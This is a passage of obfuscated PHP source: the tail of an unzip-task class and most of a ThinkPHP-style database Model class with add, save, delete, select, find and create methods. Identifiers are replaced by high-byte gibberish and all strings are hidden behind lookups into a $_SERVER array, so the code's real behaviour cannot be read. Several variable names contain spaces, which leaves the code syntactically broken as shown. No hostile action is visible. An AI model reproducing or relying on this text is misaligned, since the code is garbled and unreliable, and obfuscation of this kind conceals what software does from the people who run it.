$Õ¿ì³æ; $Ş¹£²è¨[$ªÏÈ½ä[1823]] = $Ÿ’õ­ûæ; $Ş¹£²è¨[$ªÏÈ½ä[1138]] = $„â·ôÖ == $ªÏÈ½ä[1890] ? $ªÏÈ½ä[1891] : $ªÏÈ½ä[1892]; $Ş¹£²è¨[$ªÏÈ½ä[1824]] = $ªÏÈ½ä[12]; $Ş¹£²è¨[$ªÏÈ½ä[836]] = $Õ¿ì³æ; $Ş¹£²è¨[$ªÏÈ½ä[1888]] = $ªÏÈ½ä[400]; $this->update(); } public function unzipAfter($¬öÀí‚›) { $ÚÆÉ´Ö =& $_SERVER[Ò°Ì”İ•]; $Ğº“‚€× =& $this->task; $Ğº“‚€×[$ÚÆÉ´Ö[1888]] = $ÚÆÉ´Ö[121]; $§ñ’ğö³ = IO::infoWithChildren($¬öÀí‚›); $³¬·ÚÓÎ = 0; $Ğº“‚€×[$ÚÆÉ´Ö[1831]] = array($ÚÆÉ´Ö[1832] => $³¬·ÚÓÎ + 1, $ÚÆÉ´Ö[506] => $§ñ’ğö³[$ÚÆÉ´Ö[32]], $ÚÆÉ´Ö[98] => $§ñ’ğö³[$ÚÆÉ´Ö[98]], $ÚÆÉ´Ö[594] => $§ñ’ğö³[$ÚÆÉ´Ö[594]] ? $§ñ’ğö³[$ÚÆÉ´Ö[594]] : $§ñ’ğö³[$ÚÆÉ´Ö[98]]); if ($§ñ’ğö³[$ÚÆÉ´Ö[33]] == $ÚÆÉ´Ö[243]) { $Ğº“‚€×[$ÚÆÉ´Ö[1136]] = 1; } else { $Ğº“‚€×[$ÚÆÉ´Ö[1136]] = $§ñ’ğö³[$ÚÆÉ´Ö[93]][$ÚÆÉ´Ö[91]]; } $Ğº“‚€×[$ÚÆÉ´Ö[1138]] = $ÚÆÉ´Ö[12]; $Ğº“‚€×[$ÚÆÉ´Ö[1824]] = 0; $Ğº“‚€×[$ÚÆÉ´Ö[1769]] = 0; $Ğº“‚€×[$ÚÆÉ´Ö[1822]] = 0; $Ğº“‚€×[$ÚÆÉ´Ö[1823]] = 0; $Ğº“‚€×[$ÚÆÉ´Ö[1820]] = $ÚÆÉ´Ö[12]; $Ğº“‚€×[$ÚÆÉ´Ö[1827]] = 0; $Ğº“‚€×[$ÚÆÉ´Ö[836]] = $§ñ’ğö³[$ÚÆÉ´Ö[90]]; $this->update(); self::log($ÚÆÉ´Ö[1893] . json_encode(array($Ğº“‚€×, $§ñ’ğö³))); } public function nameParse($Û‰ÜéÀ) { $á±²óä =& $_SERVER[Ò°Ì”İ•]; $Ò©ÍŠ®æ =& $this->task; if ($Ò©ÍŠ®æ[$á±²óä[1888]] == $á±²óä[1275]) { $Ò©ÍŠ®æ[$á±²óä[1888]] = $á±²óä[400]; $Ò©ÍŠ®æ[$á±²óä[1827]] = 0; $Ò©ÍŠ®æ[$á±²óä[836]] = 0; } $Ô¼·²¼— = get_path_this($Û‰ÜéÀ); if (strstr($Ô¼·²¼—, $á±²óä[10])) { $Ò©ÍŠ®æ[$á±²óä[1769]] += 1; $Ò©ÍŠ®æ[$á±²óä[1136]] += 1; } $Ò©ÍŠ®æ[$á±²óä[1820]] = $Û‰ÜéÀ; $this->update(); } } goto DŒŸ†ÈŸ¡Ñ; F‰‚òˆƒˆ½: define($_SERVER[Ò°Ì”İ•][331], 0); define($_SERVER[Ò°Ì”İ•][332], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\x6f\162\x64\x65\x72", "\x61\154\151\141\x73", "\x68\141\166\151\x6e\147", "\147\162\x6f\x75\x70", "\154\157\143\153", "\x64\x69\x73\x74\151\x6e\x63\164", "\141\x75\164\x6f", "\x66\x69\154\164\145\x72", "\x76\141\x6c\151\144\x61\164\x65", "\x72\x65\163\x75\154\x74", "\x62\x69\156\144", "\x74\157\x6b\145\156"); public function __construct($ïåÑŒõ« = '', $õø†µ¥ = '', $¢Æ¡İ¾ = '') { $ãµæŸ‘Ë =& $_SERVER[Ò°Ì”İ•]; $this->_initialize(); if (!empty($ïåÑŒõ«)) { if (strpos($ïåÑŒõ«, $ãµæŸ‘Ë[10])) { list($this->dbName, $this->name) = explode($ãµæŸ‘Ë[10], $ïåÑŒõ«); } else { $this->name = $ïåÑŒõ«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($õø†µ¥)) { $this->tablePrefix = $ãµæŸ‘Ë[12]; } elseif ($ãµæŸ‘Ë[12] != $õø†µ¥) { $this->tablePrefix = $õø†µ¥; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ãµæŸ‘Ë[333]); } $this->db(0, empty($this->connection) ? $¢Æ¡İ¾ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $´¼Ñøç =& $_SERVER[Ò°Ì”İ•]; if (empty($this->fields)) { if (think_config($´¼Ñøç[334])) { $è§ú»ğŸ = $this->dbName ? $this->dbName : think_config($´¼Ñøç[335]); $ñ¥ÁÙ³ = think_var_cache($´¼Ñøç[336] . strtolower(get_path_this($è§ú»ğŸ) . $´¼Ñøç[10] . $this->name)); if ($ñ¥ÁÙ³) { $‰ĞÁØˆù = think_config($´¼Ñøç[337]); if (empty($‰ĞÁØˆù) || $ñ¥ÁÙ³[$´¼Ñøç[338]] == $‰ĞÁØˆù) { $this->fields = $ñ¥ÁÙ³; return; } } } $this->flush(); } } public function flush() { $ãâı‚©Õ =& $_SERVER[Ò°Ì”İ•]; $this->db->setModel($this->name); $œêî—äâ = $this->db->getFields($this->getTableName()); if (!$œêî—äâ) { return !1; } $this->fields = array_keys($œêî—äâ); $this->fields[$ãâı‚©Õ[339]] = !1; foreach ($œêî—äâ as $ˆœ¿®¯º => $ËàªÊßü) { $—Ì×ÀÒ¯[$ˆœ¿®¯º] = $ËàªÊßü[$ãâı‚©Õ[33]]; if ($ËàªÊßü[$ãâı‚©Õ[39]]) { $this->fields[$ãâı‚©Õ[340]] = $ˆœ¿®¯º; if ($ËàªÊßü[$ãâı‚©Õ[42]]) { $this->fields[$ãâı‚©Õ[339]] = !0; } } } $this->fields[$ãâı‚©Õ[341]] = $—Ì×ÀÒ¯; if (think_config($ãâı‚©Õ[337])) { $this->fields[$ãâı‚©Õ[338]] = think_config($ãâı‚©Õ[337]); } if (think_config($ãâı‚©Õ[334])) { $²Çš¼øØ = $this->dbName ? $this->dbName : think_config($ãâı‚©Õ[335]); think_var_cache($ãâı‚©Õ[336] . strtolower(get_path_this($²Çš¼øØ) . $ãâı‚©Õ[10] . $this->name), $this->fields); } } public function switchModel($¹çÑÃëø, $èó€Ôú = array()) { $‚Ÿó·‰ =& $_SERVER[Ò°Ì”İ•]; $ˆûæÀ»Œ = ucwords(strtolower($¹çÑÃëø)) . $‚Ÿó·‰[342]; if (!class_exists($ˆûæÀ»Œ)) { think_exception($ˆûæÀ»Œ . think_lang($‚Ÿó·‰[343])); } $this->_extModel = new $ˆûæÀ»Œ($this->name); if (!empty($èó€Ôú)) { foreach ($èó€Ôú as $€ÒŒÂÍß) { $this->_extModel->setProperty($€ÒŒÂÍß, $this->{$€ÒŒÂÍß}); } } return $this->_extModel; } public function __set($õİÓê¼û, $ûÁ¯³­Ğ) { $this->data[$õİÓê¼û] = $ûÁ¯³­Ğ; } public function __get($ô±Ë±åÇ) { return isset($this->data[$ô±Ë±åÇ]) ? $this->data[$ô±Ë±åÇ] : null; } public function __isset($óó¢ïÒ) { return isset($this->data[$óó¢ïÒ]); } public function __unset($—ğ°©Ôİ) { unset($this->data[$—ğ°©Ôİ]); } public function __call($æ°øÚßÏ, $­ÌìŸØÓ) { $Áéìë² =& $_SERVER[Ò°Ì”İ•]; if (in_array(strtolower($æ°øÚßÏ), $this->methods, !0)) { $this->options[strtolower($æ°øÚßÏ)] = $­ÌìŸØÓ[0]; return $this; } elseif (in_array(strtolower($æ°øÚßÏ), array($Áéìë²[344], $Áéìë²[345], $Áéìë²[346], $Áéìë²[347], $Áéìë²[348]), !0)) { $ç¦Æ¨¶ = isset($­ÌìŸØÓ[0]) ? $­ÌìŸØÓ[0] : $Áéìë²[233]; $ç¦Æ¨¶ = $this->db->parseKey($ç¦Æ¨¶); return $this->getField(strtoupper($æ°øÚßÏ) . $Áéìë²[349] . $ç¦Æ¨¶ . $Áéìë²[350] . $æ°øÚßÏ, $Áéìë²[344]); } elseif (strtolower(substr($æ°øÚßÏ, 0, 5)) == $Áéìë²[351]) { $ç¦Æ¨¶ = think_parse_name(substr($æ°øÚßÏ, 5)); $ø÷‚¼Äè[$ç¦Æ¨¶] = $­ÌìŸØÓ[0]; return $this->where($ø÷‚¼Äè)->find(); } elseif (strtolower(substr($æ°øÚßÏ, 0, 10)) == $Áéìë²[352]) { $³æ»®’Ö = think_parse_name(substr($æ°øÚßÏ, 10)); $ø÷‚¼Äè[$³æ»®’Ö] = $­ÌìŸØÓ[0]; return $this->where($ø÷‚¼Äè)->getField($­ÌìŸØÓ[1]); } elseif (isset($this->_scope[$æ°øÚßÏ])) { return $this->scope($æ°øÚßÏ, $­ÌìŸØÓ[0]); } elseif (method_exists($this, $æ°øÚßÏ)) { array_unshift($­ÌìŸØÓ, $æ°øÚßÏ); return call_user_func_array(array($this, $Áéìë²[353]), $­ÌìŸØÓ); } else { return call_user_func_array(array(parent, $æ°øÚßÏ), $­ÌìŸØÓ); } } protected function call() { $ÍœğÖà =& $_SERVER[Ò°Ì”İ•]; $ÕàÓÑ­è = func_get_args(); $¡°Å—· = array_shift($ÕàÓÑ­è); $ÛÀ€×— = $¡°Å—·; if (is_array($¡°Å—·)) { $ÛÀ€×— = $¡°Å—·[1]; $¡°Å—· = $¡°Å—·[0]; } $±èü¡Öç = count($ÕàÓÑ­è) - 1; if (isset($ÕàÓÑ­è[$±èü¡Öç]) && $ÕàÓÑ­è[$±èü¡Öç] === $¡°Å—·) { think_exception(__CLASS__ . $ÍœğÖà[4] . $¡°Å—· . think_lang($ÍœğÖà[354])); return; } $ÕàÓÑ­è[] = $¡°Å—·; if (method_exists($this, $ÍœğÖà[355])) { $âÂß¦¬¿ = call_user_func_array(array($this, $ÍœğÖà[356]), array($ÛÀ€×—, $ÕàÓÑ­è)); if (!is_null($âÂß¦¬¿) && $âÂß¦¬¿ !== !1) { return $âÂß¦¬¿; } } $ı§â­» = call_user_func_array(array($this, $¡°Å—·), $ÕàÓÑ­è); if (method_exists($this, $ÍœğÖà[357])) { $âÂß¦¬¿ = call_user_func_array(array($this, $ÍœğÖà[358]), array($ÛÀ€×—, $ÕàÓÑ­è, $ı§â­»)); if ($âÂß¦¬¿) { return $âÂß¦¬¿; } } return $ı§â­»; } protected function _initialize() { } protected function _facade($¤‹œäüÑ) { $ä¿Âä =& $_SERVER[Ò°Ì”İ•]; if (!empty($this->fields)) { foreach ($¤‹œäüÑ as $­…İÓ´ó => $•ğæùË) { if (is_array($this->fields) && !in_array($­…İÓ´ó, $this->fields, !0)) { unset($¤‹œäüÑ[$­…İÓ´ó]); } elseif (is_scalar($•ğæùË)) { $this->_parseType($¤‹œäüÑ, $­…İÓ´ó); } } } if (!empty($this->options[$ä¿Âä[359]])) { $¤‹œäüÑ = array_map($this->options[$ä¿Âä[359]], $¤‹œäüÑ); unset($this->options[$ä¿Âä[359]]); } $this->_beforeWrite($¤‹œäüÑ); return $¤‹œäüÑ; } protected function _beforeWrite(&$ä¦¦„Íü) { } public function add($Ô¾§ƒñ„ = '', $Ë÷«Â¹ = array(), $ÇëÈ¥ ù = false) { if (empty($Ô¾§ƒñ„)) { if (!empty($this->data)) { $Ô¾§ƒñ„ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ò°Ì”İ•][360]); return !1; } } $Ë÷«Â¹ = $this->_parseOptions($Ë÷«Â¹); $Ô¾§ƒñ„ = $this->_facade($Ô¾§ƒñ„); if (!1 === $this->_beforeInsert($Ô¾§ƒñ„, $Ë÷«Â¹)) { return !1; } $ş‡Ÿ·«Ü = $this->db->insert($Ô¾§ƒñ„, $Ë÷«Â¹, $ÇëÈ¥ ù); if (!1 !== $ş‡Ÿ·«Ü) { $­„õ ê­ = $this->getLastInsID(); if ($­„õ ê­) { $Ô¾§ƒñ„[$this->getPk()] = $­„õ ê­; $this->_after_insert($Ô¾§ƒñ„, $Ë÷«Â¹); return $­„õ ê­; } $this->_after_insert($Ô¾§ƒñ„, $Ë÷«Â¹); } return $ş‡Ÿ·«Ü; } protected function _beforeInsert(&$¹âÍÜˆ¾, $§µ»ª†‡) { } protected function _after_insert($Ğùôƒç¨, $¶¯…±‰Ê) { } public function addAll($·øğÉ·È, $—×Ó…Ã¬ = array(), $—ïï‘Ï¼ = false) { $ä§ıÈ¨‘ =& $_SERVER[Ò°Ì”İ•]; if (empty($·øğÉ·È)) { $this->error = think_lang($ä§ıÈ¨‘[360]); return !1; } $—×Ó…Ã¬ = $this->_parseOptions($—×Ó…Ã¬); foreach ($·øğÉ·È as $€Ÿ¨½•ù => $•çÊ¨ƒÕ) { $·øğÉ·È[$€Ÿ¨½•ù] = $this->_facade($•çÊ¨ƒÕ); } if (method_exists($this->db, $ä§ıÈ¨‘[361])) { $ñÑ²úæ = $this->db->insertAll($·øğÉ·È, $—×Ó…Ã¬, $—ïï‘Ï¼); } else { $this->startTrans(); foreach ($·øğÉ·È as $€Ÿ¨½•ù => $•çÊ¨ƒÕ) { $ñÑ²úæ = $this->db->insert($•çÊ¨ƒÕ, $—×Ó…Ã¬, $—ïï‘Ï¼); } $this->commit(); } if (!1 !== $ñÑ²úæ) { $æÑ•Ü¬Õ = $this->getLastInsID(); if ($æÑ•Ü¬Õ) { return $æÑ•Ü¬Õ; } } return $ñÑ²úæ; } public function selectAdd($—‘ëßÎ© = '', $€œã½íÙ = '', $œ¢É¬Áü = array()) { $íöù±³Ÿ =& $_SERVER[Ò°Ì”İ•]; $œ¢É¬Áü = $this->_parseOptions($œ¢É¬Áü); if (!1 === ($şçŸÇï = $this->db->selectInsert($—‘ëßÎ© ? $—‘ëßÎ© : $œ¢É¬Áü[$íöù±³Ÿ[362]], $€œã½íÙ ? $€œã½íÙ : $this->getTableName(), $œ¢É¬Áü))) { $this->error = think_lang($íöù±³Ÿ[363]); return !1; } else { return $şçŸÇï; } } public function save($ãùä¥á´ = '', $ß¢Ñ¶Öˆ = array()) { $Òôı¿‘ã =& $_SERVER[Ò°Ì”İ•]; if (empty($ãùä¥á´)) { if (!empty($this->data)) { $ãùä¥á´ = $this->data; $this->data = array(); } else { $this->error = think_lang($Òôı¿‘ã[360]); return !1; } } $ãùä¥á´ = $this->_facade($ãùä¥á´); $ß¢Ñ¶Öˆ = $this->_parseOptions($ß¢Ñ¶Öˆ); $ê“µÈÂ¿ = $this->getPk(); if (!isset($ß¢Ñ¶Öˆ[$Òôı¿‘ã[364]])) { if (isset($ãùä¥á´[$ê“µÈÂ¿])) { $«¤òæîï[$ê“µÈÂ¿] = $ãùä¥á´[$ê“µÈÂ¿]; $ß¢Ñ¶Öˆ[$Òôı¿‘ã[364]] = $«¤òæîï; unset($ãùä¥á´[$ê“µÈÂ¿]); } else { $this->error = think_lang($Òôı¿‘ã[363]); return !1; } } if (is_array($ß¢Ñ¶Öˆ[$Òôı¿‘ã[364]]) && isset($ß¢Ñ¶Öˆ[$Òôı¿‘ã[364]][$ê“µÈÂ¿])) { $Çòƒ˜ªù = $ß¢Ñ¶Öˆ[$Òôı¿‘ã[364]][$ê“µÈÂ¿]; } if (!1 === $this->_beforeUpdate($ãùä¥á´, $ß¢Ñ¶Öˆ)) { return !1; } $ñÖ´õÑ = $this->db->update($ãùä¥á´, $ß¢Ñ¶Öˆ); if (!1 !== $ñÖ´õÑ) { if (isset($Çòƒ˜ªù)) { $ãùä¥á´[$ê“µÈÂ¿] = $Çòƒ˜ªù; } $this->_afterUpdate($ãùä¥á´, $ß¢Ñ¶Öˆ); } return $ñÖ´õÑ; } protected function _beforeUpdate(&$•­•ŒôË, $ÙöåÕ ) { } protected function _afterUpdate($á·õã·, $äè²à¡) { } public function delete($Ô—ãÉ¦„ = array()) { $ù×öÔéÚ =& $_SERVER[Ò°Ì”İ•]; if (empty($Ô—ãÉ¦„) && empty($this->options[$ù×öÔéÚ[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $³ìÉ³í‰ = $this->getPk(); if (is_numeric($Ô—ãÉ¦„) || is_string($Ô—ãÉ¦„)) { if (strpos($Ô—ãÉ¦„, $ù×öÔéÚ[50])) { $™ûùÔÑò[$³ìÉ³í‰] = array($ù×öÔéÚ[365], $Ô—ãÉ¦„); } else { $™ûùÔÑò[$³ìÉ³í‰] = $Ô—ãÉ¦„; } $this->options[$ù×öÔéÚ[364]] = $™ûùÔÑò; } $Ô—ãÉ¦„ = $this->_parseOptions(); if (is_array($Ô—ãÉ¦„[$ù×öÔéÚ[364]]) && isset($Ô—ãÉ¦„[$ù×öÔéÚ[364]][$³ìÉ³í‰])) { $ »ıíÍ£ = $Ô—ãÉ¦„[$ù×öÔéÚ[364]][$³ìÉ³í‰]; } $¡µà®É = $this->db->delete($Ô—ãÉ¦„); if (!1 !== $¡µà®É) { $ùšÂ¬ÒĞ = array(); if (isset($ »ıíÍ£)) { $ùšÂ¬ÒĞ[$³ìÉ³í‰] = $ »ıíÍ£; } $this->_after_delete($ùšÂ¬ÒĞ, $Ô—ãÉ¦„); } return $¡µà®É; } protected function _after_delete($Ô¡ç¤Ñµ, $Â¸íáˆú) { } public function select($Å¬‡îü = array()) { $âÚ‹¤åÈ =& $_SERVER[Ò°Ì”İ•]; if (is_string($Å¬‡îü) || is_numeric($Å¬‡îü)) { $è¥çª¢ı = $this->getPk(); if (strpos($Å¬‡îü, $âÚ‹¤åÈ[50])) { $×êõêªø[$è¥çª¢ı] = array($âÚ‹¤åÈ[365], $Å¬‡îü); } else { $×êõêªø[$è¥çª¢ı] = $Å¬‡îü; } $this->options[$âÚ‹¤åÈ[364]] = $×êõêªø; } elseif (!1 === $Å¬‡îü) { $Å¬‡îü = $this->_parseOptions(); return $âÚ‹¤åÈ[366] . $this->db->buildSelectSql($Å¬‡îü) . $âÚ‹¤åÈ[367]; } $Å¬‡îü = $this->_parseOptions(); $ò¿ïå¶¡ = $this->db->select($Å¬‡îü); if (!1 === $ò¿ïå¶¡) { return !1; } if (empty($ò¿ïå¶¡)) { return null; } $this->_afterSelect($ò¿ïå¶¡, $Å¬‡îü); return $ò¿ïå¶¡; } protected function _afterSelect(&$ù›»şµØ, $©ÎÈ˜ë™) { } public function buildSql($ £…ó½¨ = array()) { $â”ÛÊõ =& $_SERVER[Ò°Ì”İ•]; $ £…ó½¨ = $this->_parseOptions($ £…ó½¨); return $â”ÛÊõ[366] . $this->db->buildSelectSql($ £…ó½¨) . $â”ÛÊõ[367]; } public function optionsValue($—÷ƒÊÏ¾ = null) { if (is_null($—÷ƒÊÏ¾)) { return $this->options; } elseif (is_array($—÷ƒÊÏ¾)) { $this->options = array_merge($this->options, $—÷ƒÊÏ¾); } } protected function _parseOptions($«ş¯îèû = array()) { $µÄ‘„˜ü =& $_SERVER[Ò°Ì”İ•]; if (is_array($«ş¯îèû)) { $«ş¯îèû = array_merge($this->options, $«ş¯îèû); } $this->options = array(); if (!isset($«ş¯îèû[$µÄ‘„˜ü[368]])) { $«ş¯îèû[$µÄ‘„˜ü[368]] = $this->getTableName(); $åı…òß = $this->fields; } else { $åı…òß = $this->getDbFields(); } if (!empty($«ş¯îèû[$µÄ‘„˜ü[369]])) { $«ş¯îèû[$µÄ‘„˜ü[368]] .= $µÄ‘„˜ü[53] . $«ş¯îèû[$µÄ‘„˜ü[369]]; } $«ş¯îèû[$µÄ‘„˜ü[370]] = $this->name; if (isset($«ş¯îèû[$µÄ‘„˜ü[364]]) && is_array($«ş¯îèû[$µÄ‘„˜ü[364]]) && !empty($åı…òß) && !isset($«ş¯îèû[$µÄ‘„˜ü[371]]) && !isset($«ş¯îèû[$µÄ‘„˜ü[368]])) { foreach ($«ş¯îèû[$µÄ‘„˜ü[364]] as $²Ñ™²§í => $Ìµ§è“­) { $²Ñ™²§í = trim($²Ñ™²§í); if (in_array($²Ñ™²§í, $åı…òß, !0)) { if (is_scalar($Ìµ§è“­)) { $this->_parseType($«ş¯îèû[$µÄ‘„˜ü[364]], $²Ñ™²§í); } } elseif (!is_numeric($²Ñ™²§í) && $µÄ‘„˜ü[11] != substr($²Ñ™²§í, 0, 1) && !1 === strpos($²Ñ™²§í, $µÄ‘„˜ü[10]) && !1 === strpos($²Ñ™²§í, $µÄ‘„˜ü[349]) && !1 === strpos($²Ñ™²§í, $µÄ‘„˜ü[225]) && !1 === strpos($²Ñ™²§í, $µÄ‘„˜ü[297])) { unset($«ş¯îèû[$µÄ‘„˜ü[364]][$²Ñ™²§í]); } } } $this->_options_filter($«ş¯îèû); return $«ş¯îèû; } protected function _options_filter(&$ÜÅøÓóä) { } protected function _parseType(&$Ò‡˜û§ò, $² œ‰’›) { $Ö½€Ñ» =& $_SERVER[Ò°Ì”İ•]; if (empty($this->options[$Ö½€Ñ»[372]][$Ö½€Ñ»[4] . $² œ‰’›])) { $¶›¤û·í = strtolower($this->fields[$Ö½€Ñ»[341]][$² œ‰’›]); if (!1 !== strpos($¶›¤û·í, $Ö½€Ñ»[373])) { } elseif (!1 === strpos($¶›¤û·í, $Ö½€Ñ»[374]) && !1 !== strpos($¶›¤û·í, $Ö½€Ñ»[375])) { $Ò‡˜û§ò[$² œ‰’›] = intval($Ò‡˜û§ò[$² œ‰’›]); } elseif (!1 !== strpos($¶›¤û·í, $Ö½€Ñ»[376]) || !1 !== strpos($¶›¤û·í, $Ö½€Ñ»[377])) { $Ò‡˜û§ò[$² œ‰’›] = floatval($Ò‡˜û§ò[$² œ‰’›]); } elseif (!1 !== strpos($¶›¤û·í, $Ö½€Ñ»[378])) { $Ò‡˜û§ò[$² œ‰’›] = (bool) $Ò‡˜û§ò[$² œ‰’›]; } } } public function find($Ù¬ñ = array()) { $õ±ˆÑ¡ü =& $_SERVER[Ò°Ì”İ•]; if (is_numeric($Ù¬ñ) || is_string($Ù¬ñ)) { $š‡÷£³ı[$this->getPk()] = intval($Ù¬ñ); $this->options[$õ±ˆÑ¡ü[364]] = $š‡÷£³ı; } $this->options[$õ±ˆÑ¡ü[379]] = 1; $Ù¬ñ = $this->_parseOptions(); $Á«ÒÉú¾ = $this->db->select($Ù¬ñ); if (!1 === $Á«ÒÉú¾) { return !1; } if (empty($Á«ÒÉú¾)) { return null; } $this->data = $Á«ÒÉú¾[0]; $this->_afterFind($this->data, $Ù¬ñ); if (!empty($this->options[$õ±ˆÑ¡ü[380]])) { return $this->returnResult($this->data, $this->options[$õ±ˆÑ¡ü[380]]); } return $this->data; } protected function _afterFind(&$Û…í£”Œ, $İáæ‡Õ¥) { } protected function returnResult($öïÍÏçå, $æŸÙÖ¹Û = '') { $Ã¿½Ôù§ =& $_SERVER[Ò°Ì”İ•]; if ($æŸÙÖ¹Û) { if (is_callable($æŸÙÖ¹Û)) { return call_user_func($æŸÙÖ¹Û, $öïÍÏçå); } switch (strtolower($æŸÙÖ¹Û)) { case $Ã¿½Ôù§[381]: return json_encode($öïÍÏçå); case $Ã¿½Ôù§[382]: return xml_encode($öïÍÏçå); } } return $öïÍÏçå; } public function parseFieldsMap($ß¨ßåÙÒ, $†­¦ˆã = 1) { if (!empty($this->_map)) { foreach ($this->_map as $üÕÁ·î => $úß“î©¸) { if ($†­¦ˆã == 1) { if (isset($ß¨ßåÙÒ[$úß“î©¸])) { $ß¨ßåÙÒ[$üÕÁ·î] = $ß¨ßåÙÒ[$úß“î©¸]; unset($ß¨ßåÙÒ[$úß“î©¸]); } } else { if (isset($ß¨ßåÙÒ[$üÕÁ·î])) { $ß¨ßåÙÒ[$úß“î©¸] = $ß¨ßåÙÒ[$üÕÁ·î]; unset($ß¨ßåÙÒ[$üÕÁ·î]); } } } } return $ß¨ßåÙÒ; } public function setField($ç²ş„Øø, $«ì”Ç = '') { if (is_array($ç²ş„Øø)) { $£ê¨ÊÀø = $ç²ş„Øø; } else { $£ê¨ÊÀø[$ç²ş„Øø] = $«ì”Ç; } return $this->save($£ê¨ÊÀø); } public function setAdd($Ì±³ªüç, $®ƒÂíæñ = 1) { $ëÌ½â›€ =& $_SERVER[Ò°Ì”İ•]; $°ÛŠØøª = $Ì±³ªüç . $ëÌ½â›€[383] . $®ƒÂíæñ; if ($®ƒÂíæñ < 0) { $°ÛŠØøª = $Ì±³ªüç . $®ƒÂíæñ; } return $this->setField($Ì±³ªüç, array($ëÌ½â›€[384], $°ÛŠØøª)); } public function getField($æÌ¾˜›, $Ë­Ïş…‡ = null) { $©¢ş­Àá =& $_SERVER[Ò°Ì”İ•]; $ƒ¯Æ¢ƒ¼[$©¢ş­Àá[362]] = $æÌ¾˜›; $ƒ¯Æ¢ƒ¼ = $this->_parseOptions($ƒ¯Æ¢ƒ¼); $æÌ¾˜› = trim($æÌ¾˜›); if (strpos($æÌ¾˜›, $©¢ş­Àá[50])) { if (!isset($ƒ¯Æ¢ƒ¼[$©¢ş­Àá[379]])) { $ƒ¯Æ¢ƒ¼[$©¢ş­Àá[379]] = is_numeric($Ë­Ïş…‡) ? $Ë­Ïş…‡ : $©¢ş­Àá[12]; } $ğ­¹×îà = $this->db->select($ƒ¯Æ¢ƒ¼); if (!empty($ğ­¹×îà)) { $±Òç˜Î = explode($©¢ş­Àá[50], $æÌ¾˜›); $æÌ¾˜› = array_keys($ğ­¹×îà[0]); $«²‡äÊ¬ = array_shift($æÌ¾˜›); $ßÅˆÛá× = array_shift($æÌ¾˜›); $Óòò¾­ = array(); $Ú Ú²…º = count($±Òç˜Î); foreach ($ğ­¹×îà as $¶‘ÊÃÔŸ) { $üŸÂˆì« = $¶‘ÊÃÔŸ[$«²‡äÊ¬]; if (2 == $Ú Ú²…º) { $Óòò¾­[$üŸÂˆì«] = $¶‘ÊÃÔŸ[$ßÅˆÛá×]; } else { $Óòò¾­[$üŸÂˆì«] = is_string($Ë­Ïş…‡) ? implode($Ë­Ïş…‡, $¶‘ÊÃÔŸ) : $¶‘ÊÃÔŸ; } } return $Óòò¾­; } } else { if (!0 !== $Ë­Ïş…‡) { $ƒ¯Æ¢ƒ¼[$©¢ş­Àá[379]] = is_numeric($Ë­Ïş…‡) ? $Ë­Ïş…‡ : 1; } if ($Ë­Ïş…‡ === $©¢ş­Àá[344]) { unset($ƒ¯Æ¢ƒ¼[$©¢ş­Àá[379]]); } $¶‘ÊÃÔŸ = $this->db->select($ƒ¯Æ¢ƒ¼); if (!empty($¶‘ÊÃÔŸ)) { if ($Ë­Ïş…‡ === $©¢ş­Àá[344]) { return reset($¶‘ÊÃÔŸ[0]); } if (!0 !== $Ë­Ïş…‡ && 1 == $ƒ¯Æ¢ƒ¼[$©¢ş­Àá[379]]) { return reset($¶‘ÊÃÔŸ[0]); } foreach ($¶‘ÊÃÔŸ as $ÅÛµ·Ø) { $®öáÀ››[] = $ÅÛµ·Ø[$æÌ¾˜›]; } return $®öáÀ››; } } return null; } public function create($¹âÎù« = '', $º—›À± = '') { $ë±²¸‹¼ =& $_SERVER[Ò°Ì”İ•]; if (empty($¹âÎù«)) { $¹âÎù« = $_POST; } elseif (is_object($¹âÎù«)) { $¹âÎù« = get_object_vars($¹âÎù«); } if (empty($¹âÎù«) || !is_array($¹âÎù«)) { $this->error = think_lang($ë±²¸‹¼[360]); return !1; } $¹âÎù« = $this->parseFieldsMap($¹âÎù«, 0); $º—›À± = $º—›À± ? $º—›À± : (!empty($¹âÎù«[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ë±²¸‹¼[362]])) { $•À×À¹ì = $this->options[$ë±²¸‹¼[362]]; unset($this->options[$ë±²¸‹¼[362]]); } elseif ($º—›À± == THINK_MODEL_INSERT && isset($this->insertFields)) { $•À×À¹ì = $this->insertFields; } elseif ($º—›À± == THINK_MODEL_UPDATE && isset($this->updateFields)) { $•À×À¹ì = $this->updateFields; } if (isset($•À×À¹ì)) { if (is_string($•À×À¹ì)) { $•À×À¹ì = explode($ë±²¸‹¼[50], $•À×À¹ì); } if (think_config($ë±²¸‹¼[385])) { $•À×À¹ì[] = think_config($ë±²¸‹¼[386]); } foreach ($¹âÎù« as $óÌÕ´û„ => $§˜˜Á¹é) { if (!in_array($óÌÕ´û„, $•À×À¹ì)) { unset($¹âÎù«[$óÌÕ´û„]); } } } if (!$this->autoValidation($¹âÎù«, $º—›À±)) { return !1; } if (!$this->autoCheckToken($¹âÎù«)) { $this->error = think_lang($ë±²¸‹¼[387]); return !1; } if ($this->autoCheckFields) { $•À×À¹ì = $this->getDbFields(); foreach ($¹âÎù« as $óÌÕ´û„ => $§˜˜Á¹é) { if (!in_array($óÌÕ´û„, $•À×À¹ì)) { unset($¹âÎù«[$óÌÕ´û„]); } elseif (MAGIC_QUOTES_GPC && is_string($§˜˜Á¹é)) { $¹âÎù«[$óÌÕ´û„] = stripslashes($§˜˜Á¹é); } } } $this->autoOperation($¹âÎù«, $º—›À±); $this->data = $¹âÎù«; return $¹âÎù«; } public function autoCheckToken($Íšëåú) { $İ¨·”àü =& $_SERVER[Ò°Ì”İ•]; if (isset($this->options[$İ¨·”àü[388]]) && 